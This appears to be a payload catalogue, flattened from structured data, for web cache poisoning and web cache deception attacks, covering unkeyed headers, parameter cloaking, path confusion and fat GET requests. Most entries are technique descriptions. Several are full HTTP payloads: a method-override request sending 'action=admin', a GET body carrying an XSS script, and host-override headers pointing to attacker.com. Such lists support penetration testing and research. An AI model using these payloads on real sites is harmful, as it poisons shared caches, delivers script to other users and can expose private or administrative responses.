unkeyed_headers.description: Cache poisoning via unkeyed HTTP headers (PortSwigger research)

payloads.description: X-Forwarded-Host — poison base URL in cached response
X-Forwarded-Scheme downgrade — force HTTP redirect in cache
X-Original-URL override — cache admin page at public URL
X-Rewrite-URL override — IIS/Nginx URL rewrite confusion
Combined port and host override for HTTPS cache poisoning
X-Host header — alternative host override for CDNs
X-Forwarded-Prefix — poison path prefix in cached links
Double URL override — IIS path confusion
Chunked TE with host override — split cache behavior

parameter_cloaking.description: Cache poisoning via parameter parsing discrepancies

payloads.description: UTM parameter — often excluded from cache key but processed
Semicolon-separated parameter — Ruby/Java parse, cache ignores
URL-encoded ampersand — CDN decodes, origin sees literal
jQuery cache-buster parameter — may be unkeyed
JSONP callback parameter — often unkeyed in CDN
Null byte parameter truncation — different parsing at CDN vs origin
Duplicate parameter — cache keys first, origin uses last

cache_deception.description: Web cache deception attack payloads (path confusion)

payloads.description: Append static extension — CDN caches dynamic response
JS extension suffix — triggers CDN static file caching
Path traversal with static suffix
Encoded traversal to static path
Dot-extension — minimal static file suffix
PNG extension on API endpoint — cache deception
Null byte before extension — origin ignores, CDN caches
Semicolon path parameter with static extension (Tomcat)

fat_get.description: Fat GET request cache poisoning (body in GET requests)

payloads.description: GET with body — some frameworks process body params on GET
GET with JSON body — Express/Flask may process
Method override header with GET body

payloads.payload:
GET /api/data HTTP/1.1
X-HTTP-Method: POST
Content-Type: application/x-www-form-urlencoded

action=admin
payloads.description: X-HTTP-Method override — cache sees GET, origin processes POST body

payloads.payload:
GET /search?q=normal HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

q=<script>alert(1)</script>
payloads.description: Fat GET with XSS payload in body — body overrides query param
Direct host replacement — poison absolute URLs in response
Duplicate Host header — CDN uses first, origin uses second
X-Forwarded-Host alongside real Host
Host with userinfo — parser confusion
Space-prefixed duplicate Host — HTTP desync
X-Forwarded-Server for Apache mod_proxy

payloads.payload:
Host: legitimate.com
X-Host: attacker.com
X-Forwarded-Host: attacker.com
payloads.description: Multiple host override headers — shotgun approach
Port injection in Host header
